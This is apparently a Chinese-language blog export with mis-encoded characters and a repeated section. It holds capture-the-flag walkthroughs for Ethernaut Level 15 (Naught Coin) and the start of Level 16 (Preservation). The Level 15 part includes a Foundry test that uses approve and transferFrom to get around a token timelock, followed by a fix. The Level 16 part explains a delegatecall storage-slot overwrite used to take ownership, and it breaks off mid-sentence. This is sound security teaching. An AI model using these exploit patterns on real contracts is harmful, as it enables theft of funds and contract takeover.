href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>ERC20 æ ‡å‡†</strong>: æ·±å…¥ç†è§£ERC20ä»£å¸æ ‡å‡†çš„å…¨éƒ¨æ¥å£æ˜¯è‡³å…³é‡è¦çš„ï¼ŒåŒ…æ‹¬ <code>transfer</code>, <code>approve</code>, <code>transferFrom</code>, <code>balanceOf</code>, <code>allowance</code> ç­‰ã€‚</li>\n<li><strong>å‡½æ•°è¦†ç›– (<code>override</code>)</strong>: åœ¨Solidityä¸­ï¼Œå½“å­åˆçº¦éœ€è¦ä¿®æ”¹çˆ¶åˆçº¦çš„è¡Œä¸ºæ—¶ï¼Œä½¿ç”¨ <code>override</code> å…³é”®å­—ã€‚ä½†å¿…é¡»å°å¿ƒï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„è¡Œä¸ºéƒ½è¢«è¦†ç›–ï¼Œä»¥é¿å…äº§ç”Ÿæ¼æ´ã€‚</li>\n<li><strong>Foundry <code>prank</code></strong>: <code>vm.startPrank</code> æ˜¯æ¨¡æ‹Ÿç‰¹å®šåœ°å€ï¼ˆå¦‚ <code>player</code>ï¼‰æ‰§è¡Œæ“ä½œçš„å¼ºå¤§å·¥å…·ï¼Œä½¿å¾—åœ¨æµ‹è¯•ä¸­æ¨¡æ‹Ÿå¤šæ­¥æ”»å‡»æµç¨‹å˜å¾—ç®€å•ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>ERC20æ ‡å‡†å®šä¹‰äº†ä¸€å¥—ä»£å¸äº¤äº’çš„æ¥å£ï¼Œä»…ä»…é™åˆ¶å…¶ä¸­ä¸€ä¸ªï¼ˆ<code>transfer</code>ï¼‰æ˜¯ä¸å¤Ÿçš„ã€‚</li>\n<li><code>approve</code> å’Œ <code>transferFrom</code> çš„ç»„åˆæ˜¯ERC20çš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼Œå…è®¸ç¬¬ä¸‰æ–¹ä»£ä¸ºè½¬ç§»ä»£å¸ã€‚</li>\n<li>åœ¨è¿›è¡Œåˆçº¦ç»§æ‰¿å’Œå‡½æ•°è¦†ç›–æ—¶ï¼Œå¿…é¡»ä¿æŒé€»è¾‘çš„ä¸€è‡´æ€§ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å¼•å…¥æ¼æ´ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>è¯†åˆ«å‡ºåˆçº¦åªé™åˆ¶äº† <code>transfer</code> å‡½æ•°ï¼Œè€Œæ²¡æœ‰é™åˆ¶ <code>transferFrom</code> å‡½æ•°ã€‚</li>\n<li>åˆ©ç”¨ <code>approve</code> å’Œ <code>transferFrom</code> çš„æ ‡å‡†åŠŸèƒ½æ¥ç»•è¿‡ä¸å®Œæ•´çš„å®‰å…¨é™åˆ¶ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>åœ¨ä¿®æ”¹ç»§æ‰¿åˆçº¦çš„åŠŸèƒ½æ—¶ï¼Œè¿›è¡Œå…¨é¢çš„å½±å“åˆ†æï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½å¾—åˆ°ä¸€è‡´çš„å¤„ç†ã€‚</li>\n<li>ä¼˜å…ˆä½¿ç”¨ç»è¿‡ç¤¾åŒºå®¡è®¡å’ŒéªŒè¯çš„æ ‡å‡†å®ç°ï¼Œè€Œä¸æ˜¯è‡ªå·±é‡æ–°å‘æ˜è½®å­ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">ERC20 Token Standard</a></li>\n<li><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol\">OpenZeppelin ERC20 Implementation</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#function-overriding\">Solidity Docs: Overriding</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFromæ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFromæ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFromæ¼æ´\"></a>ğŸ¯ Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFromæ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/15\">Ethernaut Level 15 - Naught Coin</a><br><strong>æ”»å‡»ç±»å‹</strong>: ERC20 <code>approve</code>&#x2F;<code>transferFrom</code> æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½œä¸º <code>player</code>ï¼Œä½ åˆå§‹æ‹¥æœ‰å…¨éƒ¨çš„ <code>NaughtCoin</code> ä»£å¸ã€‚ç„¶è€Œï¼Œåˆçº¦ä¸­çš„ <code>transfer</code> å‡½æ•°è¢«é”å®šï¼Œåå¹´å†…æ— æ³•è½¬ç§»ä»£å¸ã€‚ä½ çš„ç›®æ ‡æ˜¯åœ¨é”å®šæœŸç»“æŸå‰ï¼Œå°†ä½ çš„å…¨éƒ¨ä»£å¸ä»ä½ çš„åœ°å€ä¸­è½¬ç§»å‡ºå»ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg\" alt=\"Naught Coin Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ <code>NaughtCoin</code> åˆçº¦ã€‚å®ƒç»§æ‰¿è‡ª OpenZeppelin çš„ <code>ERC20</code> æ ‡å‡†åˆçº¦ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract NaughtCoin is ERC20 &#123;</span><br><span class=\"line\">    uint public timeLock;</span><br><span class=\"line\">    address public player;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class=\"line\">        player = _player;</span><br><span class=\"line\">        timeLock = block.timestamp + 10 * 365 days;</span><br><span class=\"line\">        _mint(player, 1000000 * (10**18));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier lockTokens() &#123;</span><br><span class=\"line\">        if (msg.sender == player) &#123;</span><br><span class=\"line\">            require(block.timestamp &gt; timeLock, &quot;NaughtCoin: time lock is active&quot;);</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Override transfer to lock tokens for the player</span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">        return super.transfer(_to, _value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // Other functions are inherited from ERC20</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>åˆçº¦é€šè¿‡ <code>override</code> é‡å†™äº† <code>transfer</code> å‡½æ•°ï¼Œå¹¶ä¸ºå…¶å¢åŠ äº†ä¸€ä¸ª <code>lockTokens</code> ä¿®é¥°ç¬¦ã€‚è¿™ä¸ªä¿®é¥°ç¬¦ä¼šæ£€æŸ¥ <code>msg.sender</code> æ˜¯å¦ä¸º <code>player</code>ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¦æ±‚ <code>block.timestamp</code> å¤§äº <code>timeLock</code>ï¼ˆåå¹´ä¹‹åï¼‰ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä½œä¸º <code>player</code>ï¼Œæ— æ³•ç›´æ¥è°ƒç”¨ <code>transfer</code> å‡½æ•°æ¥è½¬ç§»ä»£-ç¬”ã€‚</p>\n<p>ç„¶è€Œï¼Œå¼€å‘è€…åªé‡å†™äº† <code>transfer</code> å‡½æ•°ï¼Œå´å¿½ç•¥äº† <code>ERC20</code> æ ‡å‡†ä¸­çš„å¦ä¸€ä¸ªé‡è¦çš„ä»£å¸è½¬ç§»å‡½æ•°ï¼š<code>transferFrom(address from, address to, uint256 amount)</code>ã€‚</p>\n<p><code>transferFrom</code> å‡½æ•°å…è®¸ä¸€ä¸ªåœ°å€ï¼ˆ<code>spender</code>ï¼‰åœ¨å¾—åˆ° <code>owner</code> æˆæƒï¼ˆ<code>approve</code>ï¼‰åï¼Œä» <code>owner</code> çš„è´¦æˆ·ä¸­è½¬ç§»ä»£å¸åˆ°ä»»ä½•åœ°å€ã€‚</p>\n<p>ç”±äº <code>NaughtCoin</code> åˆçº¦æ²¡æœ‰é‡å†™ <code>transferFrom</code>ï¼Œå®ƒå°†ç›´æ¥ä½¿ç”¨ OpenZeppelin <code>ERC20</code> åˆçº¦ä¸­çš„åŸå§‹å®ç°ï¼Œè€Œè¿™ä¸ªåŸå§‹å®ç°æ˜¯æ²¡æœ‰ <code>lockTokens</code> ä¿®é¥°ç¬¦çš„ï¼</p>\n<p>å› æ­¤ï¼Œæ”»å‡»è·¯å¾„å˜å¾—æ¸…æ™°ï¼š</p>\n<ol>\n<li>æˆ‘ä»¬ï¼ˆ<code>player</code>ï¼‰è°ƒç”¨ <code>approve</code> å‡½æ•°ï¼Œæˆæƒç»™å¦ä¸€ä¸ªåœ°å€ï¼ˆå¯ä»¥æ˜¯è‡ªå·±ï¼Œä¹Ÿå¯ä»¥æ˜¯ä»»ä½•å…¶ä»–åœ°å€ï¼‰è½¬ç§»æˆ‘ä»¬çš„å…¨éƒ¨ä»£å¸ã€‚</li>\n<li>æˆ‘ä»¬ï¼ˆæˆ–è¢«æˆæƒçš„åœ°å€ï¼‰è°ƒç”¨ <code>transferFrom</code> å‡½æ•°ï¼Œå°†ä»£å¸ä»æˆ‘ä»¬çš„è´¦æˆ·ä¸­è½¬ç§»å‡ºå»ã€‚</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>åœ¨ Foundry æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ã€‚æˆ‘ä»¬ç”šè‡³ä¸éœ€è¦ä¸€ä¸ªå•ç‹¬çš„æ”»å‡»åˆçº¦ï¼Œå› ä¸º <code>player</code> å¯ä»¥æˆæƒç»™è‡ªå·±æ¥æ‰§è¡Œ <code>transferFrom</code>ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/15_NaughtCoin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract NaughtCoinTest is Test &#123;</span><br><span class=\"line\">    NaughtCoin instance;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\">    address player2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        player2 = vm.addr(2); // ä¸€ä¸ªç”¨äºæ¥æ”¶ä»£å¸çš„åœ°å€</span><br><span class=\"line\">        instance = new NaughtCoin(player1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // è·å– player1 çš„å…¨éƒ¨ä½™é¢</span><br><span class=\"line\">        uint256 playerBalance = instance.balanceOf(player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 1: player1 æˆæƒç»™ player1 (è‡ªå·±) è½¬ç§»å…¨éƒ¨ä½™é¢</span><br><span class=\"line\">        instance.approve(player1, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 2: player1 è°ƒç”¨ transferFrom å°†è‡ªå·±çš„ä»£å¸è½¬ç§»åˆ° player2</span><br><span class=\"line\">        instance.transferFrom(player1, player2, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ç»“æœ</span><br><span class=\"line\">        assertEq(instance.balanceOf(player1), 0);</span><br><span class=\"line\">        assertEq(instance.balanceOf(player2), playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è·å–ä½™é¢</strong>: é¦–å…ˆï¼Œç¡®å®š <code>player</code> åœ°å€æ‹¥æœ‰çš„ä»£å¸æ€»é‡ã€‚</li>\n<li><strong>æˆæƒ (<code>approve</code>)</strong>: <code>player</code> è°ƒç”¨ <code>instance.approve(spender, amount)</code>ï¼Œå…¶ä¸­ <code>spender</code> æ˜¯è¢«æˆæƒçš„åœ°å€ï¼Œ<code>amount</code> æ˜¯æˆæƒé¢åº¦ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è®© <code>player</code> æˆæƒç»™è‡ªå·±å…¨éƒ¨ä½™é¢ã€‚</li>\n<li><strong>è½¬ç§» (<code>transferFrom</code>)</strong>: <code>player</code> è°ƒç”¨ <code>instance.transferFrom(from, to, amount)</code>ï¼Œå…¶ä¸­ <code>from</code> æ˜¯ <code>player</code> åœ°å€ï¼Œ<code>to</code> æ˜¯æ¥æ”¶åœ°å€ï¼Œ<code>amount</code> æ˜¯è¦è½¬ç§»çš„æ•°é‡ã€‚</li>\n</ol>\n<p>è¿™ä¸ªè¿‡ç¨‹æˆåŠŸåœ°ç»•è¿‡äº† <code>transfer</code> å‡½æ•°çš„ <code>timeLock</code> é™åˆ¶ã€‚</p>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>å®Œæ•´åœ°è¦†ç›–å‡½æ•°</strong>: å½“ç»§æ‰¿ä¸€ä¸ªæ ‡å‡†ï¼ˆå¦‚ERC20ï¼‰å¹¶æ‰“ç®—ä¿®æ”¹å…¶æ ¸å¿ƒåŠŸèƒ½æ—¶ï¼Œå¿…é¡»ç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½è¢«ä¸€è‡´åœ°ä¿®æ”¹ã€‚åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œå¦‚æœ <code>transfer</code> è¢«é”å®šï¼Œé‚£ä¹ˆ <code>transferFrom</code> ä¹Ÿåº”è¯¥è¢«åŒæ ·çš„æ–¹å¼é”å®šã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ­£ç¡®çš„ä¿®å¤æ–¹å¼</span><br><span class=\"line\">function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">    return super.transferFrom(from, to, value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä½¿ç”¨æˆç†Ÿçš„ä»£å¸é”å®šåˆçº¦</strong>: ä¸å…¶è‡ªå·±å®ç°æ—¶é—´é”ï¼Œä¸å¦‚ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œä¾‹å¦‚ OpenZeppelin çš„ <code>TokenTimelock</code> åˆçº¦ã€‚è¿™äº›åˆçº¦å·²ç»è€ƒè™‘äº†å„ç§è¾¹ç¼˜æƒ…å†µã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>ERC20 æ ‡å‡†</strong>: æ·±å…¥ç†è§£ERC20ä»£å¸æ ‡å‡†çš„å…¨éƒ¨æ¥å£æ˜¯è‡³å…³é‡è¦çš„ï¼ŒåŒ…æ‹¬ <code>transfer</code>, <code>approve</code>, <code>transferFrom</code>, <code>balanceOf</code>, <code>allowance</code> ç­‰ã€‚</li>\n<li><strong>å‡½æ•°è¦†ç›– (<code>override</code>)</strong>: åœ¨Solidityä¸­ï¼Œå½“å­åˆçº¦éœ€è¦ä¿®æ”¹çˆ¶åˆçº¦çš„è¡Œä¸ºæ—¶ï¼Œä½¿ç”¨ <code>override</code> å…³é”®å­—ã€‚ä½†å¿…é¡»å°å¿ƒï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„è¡Œä¸ºéƒ½è¢«è¦†ç›–ï¼Œä»¥é¿å…äº§ç”Ÿæ¼æ´ã€‚</li>\n<li><strong>Foundry <code>prank</code></strong>: <code>vm.startPrank</code> æ˜¯æ¨¡æ‹Ÿç‰¹å®šåœ°å€ï¼ˆå¦‚ <code>player</code>ï¼‰æ‰§è¡Œæ“ä½œçš„å¼ºå¤§å·¥å…·ï¼Œä½¿å¾—åœ¨æµ‹è¯•ä¸­æ¨¡æ‹Ÿå¤šæ­¥æ”»å‡»æµç¨‹å˜å¾—ç®€å•ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>ERC20æ ‡å‡†å®šä¹‰äº†ä¸€å¥—ä»£å¸äº¤äº’çš„æ¥å£ï¼Œä»…ä»…é™åˆ¶å…¶ä¸­ä¸€ä¸ªï¼ˆ<code>transfer</code>ï¼‰æ˜¯ä¸å¤Ÿçš„ã€‚</li>\n<li><code>approve</code> å’Œ <code>transferFrom</code> çš„ç»„åˆæ˜¯ERC20çš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼Œå…è®¸ç¬¬ä¸‰æ–¹ä»£ä¸ºè½¬ç§»ä»£å¸ã€‚</li>\n<li>åœ¨è¿›è¡Œåˆçº¦ç»§æ‰¿å’Œå‡½æ•°è¦†ç›–æ—¶ï¼Œå¿…é¡»ä¿æŒé€»è¾‘çš„ä¸€è‡´æ€§ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å¼•å…¥æ¼æ´ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>è¯†åˆ«å‡ºåˆçº¦åªé™åˆ¶äº† <code>transfer</code> å‡½æ•°ï¼Œè€Œæ²¡æœ‰é™åˆ¶ <code>transferFrom</code> å‡½æ•°ã€‚</li>\n<li>åˆ©ç”¨ <code>approve</code> å’Œ <code>transferFrom</code> çš„æ ‡å‡†åŠŸèƒ½æ¥ç»•è¿‡ä¸å®Œæ•´çš„å®‰å…¨é™åˆ¶ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>åœ¨ä¿®æ”¹ç»§æ‰¿åˆçº¦çš„åŠŸèƒ½æ—¶ï¼Œè¿›è¡Œå…¨é¢çš„å½±å“åˆ†æï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½å¾—åˆ°ä¸€è‡´çš„å¤„ç†ã€‚</li>\n<li>ä¼˜å…ˆä½¿ç”¨ç»è¿‡ç¤¾åŒºå®¡è®¡å’ŒéªŒè¯çš„æ ‡å‡†å®ç°ï¼Œè€Œä¸æ˜¯è‡ªå·±é‡æ–°å‘æ˜è½®å­ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">ERC20 Token Standard</a></li>\n<li><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol\">OpenZeppelin ERC20 Implementation</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#function-overriding\">Solidity Docs: Overriding</a></li>\n</ul>\n"},{"title":"Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ","date":"2025-01-25T08:25:00.000Z","updated":"2025-01-25T08:25:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å‰–æ `delegatecall` çš„å±é™©æ€§ä»¥åŠå­˜å‚¨å¸ƒå±€ä¸åŒ¹é…å¦‚ä½•å¯¼è‡´è‡´å‘½æ¼æ´ã€‚é€šè¿‡ä¸¤æ¬¡ `delegatecall` è°ƒç”¨ï¼Œå®Œå…¨æ§åˆ¶ç›®æ ‡åˆçº¦çš„ `owner`ï¼ŒæŒæ¡ Preservation å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 16 - Preservation](https://ethernaut.openzeppelin.com/level/16)  \n> **æ”»å‡»ç±»å‹**: `delegatecall` å­˜å‚¨å¸ƒå±€æ“çºµ  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯è·å– `Preservation` åˆçº¦çš„æ‰€æœ‰æƒï¼Œå³æˆä¸ºè¯¥åˆçº¦çš„ `owner`ã€‚\n\n![Preservation Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`Preservation` åˆçº¦çš„ `owner` æ˜¯ç§æœ‰çš„ï¼Œå¹¶ä¸”æ²¡æœ‰ç›´æ¥çš„å‡½æ•°æ¥ä¿®æ”¹å®ƒã€‚æ¼æ´éšè—åœ¨ä½¿ç”¨ `delegatecall` çš„ `setFirstTime` å’Œ `setSecondTime` å‡½æ•°ä¸­ã€‚\n\n```solidity\ncontract Preservation {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    uint storedTime;\n\n    // ... constructor ...\n\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n}\n```\n\n`delegatecall` æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œç ã€‚å®ƒä¼šåœ¨è°ƒç”¨è€…åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œå¦ä¸€ä¸ªåˆçº¦çš„ä»£ç ã€‚è¿™æ„å‘³ç€ï¼Œè¢«è°ƒç”¨åˆçº¦ï¼ˆ`library`ï¼‰çš„ä»£ç å¯ä»¥ä¿®æ”¹è°ƒç”¨è€…åˆçº¦ï¼ˆ`Preservation`ï¼‰çš„å­˜å‚¨ã€‚\n\nå½“ `setFirstTime` é€šè¿‡ `delegatecall` è°ƒç”¨ `timeZone1Library` çš„ `setTime` å‡½æ•°æ—¶ï¼Œ`setTime` å‡½æ•°ä¿®æ”¹çš„å­˜å‚¨æ§½ä½æ˜¯ `Preservation` åˆçº¦çš„æ§½ä½ã€‚\n\nè®©æˆ‘ä»¬æ¯”è¾ƒä¸€ä¸‹ `Preservation` å’Œ `LibraryContract` çš„å­˜å‚¨å¸ƒå±€ï¼š\n\n| Slot | `Preservation` åˆçº¦ | `LibraryContract` åˆçº¦ |\n| :--- | :------------------ | :--------------------- |\n| 0    | `timeZone1Library`  | `storedTime`           |\n| 1    | `timeZone2Library`  | (æœªä½¿ç”¨)               |\n| 2    | `owner`             | (æœªä½¿ç”¨)               |\n| 3    | `storedTime`        | (æœªä½¿ç”¨)               |\n\nå½“ `LibraryContract.setTime(uint)` è¢« `delegatecall` è°ƒç”¨æ—¶ï¼Œå®ƒä»¥ä¸ºè‡ªå·±åœ¨ä¿®æ”¹ `storedTime`ï¼ˆä½äº slot 0ï¼‰ã€‚ä½†å®é™…ä¸Šï¼Œå®ƒä¿®æ”¹çš„æ˜¯ `Preservation` åˆçº¦çš„ slot 0ï¼Œä¹Ÿå°±æ˜¯ `timeZone1Library` çš„åœ°å€ï¼\n\nè¿™å°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæ”»å‡»è·¯å¾„ï¼š\n\n1.  **ç¬¬ä¸€æ¬¡è°ƒç”¨ `setFirstTime`**: æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„ `_timeStamp`ï¼Œè¿™ä¸ª `_timeStamp` 